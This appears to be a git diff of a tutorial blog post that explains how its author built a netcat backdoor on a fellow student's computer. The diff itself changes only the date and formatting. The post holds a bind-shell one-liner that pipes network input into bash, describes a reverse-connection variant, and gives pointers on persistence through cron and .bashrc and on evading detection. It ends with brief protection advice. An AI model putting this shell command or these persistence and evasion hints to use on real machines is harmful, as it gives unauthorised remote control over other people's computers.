@@ -1,12 +1,13 @@
 ---
 title: How I've created a backdoor?
 author: Lucas Marandat
-date: 2019-04-30T00:00:00.000Z
+date: 2020-04-30T00:00:00.000Z
 excerpt: By explaining how I've created a basic backdoor, you'll understand how
   they work and how to protect yourself.
 hero: images/hero.png
 preview: images/demo.gif
 ---
+
 ## 🚀 Introduction
 
 ### Disclaimer
@@ -43,12 +44,12 @@ nc -l -p 8080 2> /dev/null < FIFO | bash > FIFO 2>&1
 
 #### That's it! Let's go into the details :
 
-![version 1 diagram](images/diagram-version-1.0.jpg "version 1 diagram")
+![version 1 diagram](images/diagram-version-1.0.jpg 'version 1 diagram')
 
-Our backdoor is just a server that listens on port **8080** created by `nc -l -p 8080`. The server is hosted on the client-side (the target student in my case). This server takes a "bash command" (eg.  `echo "test"` ) as request and answers the output of this one (eg. `test` ).
+Our backdoor is just a server that listens on port **8080** created by `nc -l -p 8080`. The server is hosted on the client-side (the target student in my case). This server takes a "bash command" (eg. `echo "test"` ) as request and answers the output of this one (eg. `test` ).
 
-1. We use [](https://en.wikipedia.org/wiki/Named_pipe)[unix pipeline](https://en.wikipedia.org/wiki/Pipeline_(Unix)) ("|") to redirect the "request payload" (the command sent by me) to the "bash" program.
-2. We use [named pipe](https://en.wikipedia.org/wiki/Named_pipe)  ("FIFO") to redirect the output of "bash" program to the client response.
+1. We use [](https://en.wikipedia.org/wiki/Named_pipe)[unix pipeline](<https://en.wikipedia.org/wiki/Pipeline_(Unix)>) ("|") to redirect the "request payload" (the command sent by me) to the "bash" program.
+2. We use [named pipe](https://en.wikipedia.org/wiki/Named_pipe) ("FIFO") to redirect the output of "bash" program to the client response.
 
 #### Limitations :
 
@@ -61,12 +62,12 @@ What if we exchange our roles? The firewall forbids our request (because we're n
 
 To explain to you what I mean by "exchange our roles" let's look at this diagram below :
 
-![version 2 diagram](images/diagram-version-2.0.jpg "version 2 diagram")
+![version 2 diagram](images/diagram-version-2.0.jpg 'version 2 diagram')
 
 #### Step by step how this implementation works :
 
 1. The victim tries to connect to the server launched by me.
-2. When the connection is completed, me (as the server) send it the command to execute (eg.  `echo "test"` ).
+2. When the connection is completed, me (as the server) send it the command to execute (eg. `echo "test"` ).
 3. The victim sends me back the response.
 4. And so on...
 
@@ -76,21 +77,21 @@ No hard limitations, this schema is a basic client-server communication but inst
 
 #### Demo:
 
-![demo](images/demo.0.gif "demo")
+![demo](images/demo.0.gif 'demo')
 
 #### Going deeper:
 
-* What if your backdoor-server is not launched when the backdoor-client request it? Is your backdoor-client should stop? (Of course not...)
-* Is your backdoor request an IP or instead use a DNS to be more flexible? ([maybe this could help you](https://www.freenom.com/fr/index.html))
-* Can we host our backdoor-server on a VPS instead of our computer? ([here 😉](https://aws.amazon.com/fr/ec2/))
-* How can we make our backdoor-client persisting during the time (eg. when victim reboots his computer)? ([here](https://fr.wikipedia.org/wiki/Cron) and [here too](https://unix.stackexchange.com/questions/129143/what-is-the-purpose-of-bashrc-and-how-does-it-work))
-* How can the backdoor-client be almost undetectable? (name, programming language, ...)
+- What if your backdoor-server is not launched when the backdoor-client request it? Is your backdoor-client should stop? (Of course not...)
+- Is your backdoor request an IP or instead use a DNS to be more flexible? ([maybe this could help you](https://www.freenom.com/fr/index.html))
+- Can we host our backdoor-server on a VPS instead of our computer? ([here 😉](https://aws.amazon.com/fr/ec2/))
+- How can we make our backdoor-client persisting during the time (eg. when victim reboots his computer)? ([here](https://fr.wikipedia.org/wiki/Cron) and [here too](https://unix.stackexchange.com/questions/129143/what-is-the-purpose-of-bashrc-and-how-does-it-work))
+- How can the backdoor-client be almost undetectable? (name, programming language, ...)
 
 ## 😱 How can I protect myself?
 
-* Lock your computer. 😇
-* Be careful of what you download on the internet.
-* Use efficient anti-virus.
-* Implement a [Zero Trust Architecture](https://www.paloaltonetworks.com/cyberpedia/what-is-a-zero-trust-architecture)
+- Lock your computer. 😇
+- Be careful of what you download on the internet.
+- Use efficient anti-virus.
+- Implement a [Zero Trust Architecture](https://www.paloaltonetworks.com/cyberpedia/what-is-a-zero-trust-architecture)
 
 ## 📦 Source code [here](https://github.com/lucasmrdt/how-i-created-a-backdoor)
